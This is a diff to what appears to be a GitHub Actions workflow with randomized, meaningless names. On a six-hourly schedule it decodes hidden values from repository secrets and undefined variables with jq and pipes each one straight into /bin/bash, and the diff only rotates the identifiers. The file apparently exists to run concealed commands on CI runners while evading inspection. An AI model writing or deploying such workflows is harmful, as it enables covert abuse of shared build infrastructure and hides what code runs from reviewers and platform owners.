@@ -1,25 +1,26 @@
 name: nijiuhen6152
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '41 3/6 * * *'
+    - cron: '49 5/6 * * *'
 
-jobs:  # 2338
+jobs:
   build:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
       - name: nijiuhen6152
         env:
-          eocp2: ${{ secrets.eocp2 }}
+          df602: ${{ secrets.df602 }}
         run: |
-          echo $eocp2 | jq -r .fxy373 | /bin/bash
-          echo $frwsp8203 | jq -r .arfi86357 | /bin/bash
-          echo $d374 | jq -r .dzkfx3986 | /bin/bash
-          echo $gxh16579 | jq -r .s15 | /bin/bash
-          echo $ch7 | jq -r .epzzb75148 | /bin/bash
-          echo $rbjdg15609 | jq -r .izqx40 | /bin/bash
-          echo $eha3318 | jq -r .ihrm6 | /bin/bash
-          echo $tv8 | jq -r .ykdr8954 | /bin/bash
-          echo $grpu89 | jq -r .e8199 | /bin/bash
+          echo $df602 | jq -r .somq55 | /bin/bash
+          echo $dhma47204 | jq -r .o40 | /bin/bash
+          echo $unqj127 | jq -r .um8136 | /bin/bash
+          echo $ncj63 | jq -r .vkrs17 | /bin/bash
+          echo $ljdy422 | jq -r .n71 | /bin/bash
+          echo $x732 | jq -r .imj857 | /bin/bash
+          echo $r87538 | jq -r .jmcey53678 | /bin/bash
+          echo $oue6021 | jq -r .jlfia60218 | /bin/bash
+          echo $n516 | jq -r .kq84064 | /bin/bash
 
